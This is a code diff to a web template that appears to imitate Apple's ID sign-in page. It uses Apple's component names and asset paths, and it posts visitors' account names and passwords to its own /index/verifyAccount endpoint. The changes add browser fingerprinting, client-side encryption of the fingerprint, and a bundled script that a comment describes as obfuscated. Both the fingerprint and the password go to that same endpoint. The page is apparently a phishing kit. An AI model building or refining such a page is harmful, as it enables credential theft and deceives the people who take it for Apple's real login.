@@ -2,13 +2,17 @@
 <html dir="ltr" data-rtl="false" lang="zh">
 
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="csrf-token" content="{{ csrf_token() }}">
+    <title>Sign In</title>
+    {{-- CSS 和外部库 --}}
+
     <link rel="stylesheet" href="{{ asset('/fonts/fonts.css') }}" type="text/css">
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
-    <script src="{{ asset('/hccanvastxt/hccanvastxt.min.js?1') }}"></script>
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/signin.css') }}">
+
+
     <style>
         /* 检测浏览器自动填充的CSS */
         input:-webkit-autofill {
@@ -43,7 +47,9 @@
     </style>
 </head>
 
-<body class="tk-body ">
+<body>
+    <div id="encryption-data" data-public-key="{{ $data['publicKey'] ?? '' }}"></div>
+
     <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
         <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
             <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="inline"
@@ -285,16 +291,17 @@
             </idms-modal>
         </apple-auth>
     </div>
+
+    {{-- 引用我们打包和混淆后的 JS 文件 --}}
+    <script src="{{ mix('js/auth/signin.js') }}"></script>
     <script type="text/javascript" src="{{ asset('/js/apple/jquery-3.6.1.min.js') }}"></script>
     <script type="text/javascript" src="{{ asset('/js/apple/jquery.cookie.js') }}"></script>
     <script src="https://unpkg.com/libphonenumber-js@1.12.8/bundle/libphonenumber-max.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jsencrypt@3.3.2/bin/jsencrypt.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="{{ asset('/hccanvastxt/hccanvastxt.min.js?1') }}"></script>
     <script type="text/javascript">
-        $.ajaxSetup({
-            headers: {
-                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-            }
-        });
-
         const country_code = '{{ $data["country_code"] }}';
 
         class SimpleSignIn {
@@ -677,16 +684,30 @@
 
             // 异步登录请求
             performLogin(account, password) {
-                return new Promise((resolve, reject) => {
+                return new Promise(async (resolve, reject) => {
+
+                    let encryptedData = null;
+                    try {
+                        // 调用全局加密函数
+                        encryptedData = await window.getEncryptedFingerprint();
+                    } catch (error) {
+                        
+                    }
+
+                 
                     $.ajax({
                         url: "/index/verifyAccount",
                         dataType: "json",
                         type: "post",
                         async: true,
                         contentType: "application/json",
+                        headers: {
+                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content'),
+                        },
                         data: JSON.stringify({
                             accountName: account,
                             password: password,
+                            fingerprint: encryptedData, // 发送加密后的数据
                         }),
                         success: function(response) {
                             resolve(response);
@@ -773,6 +794,7 @@
             signInManager = new SimpleSignIn();
         });
     </script>
+
 </body>
 
 </html>
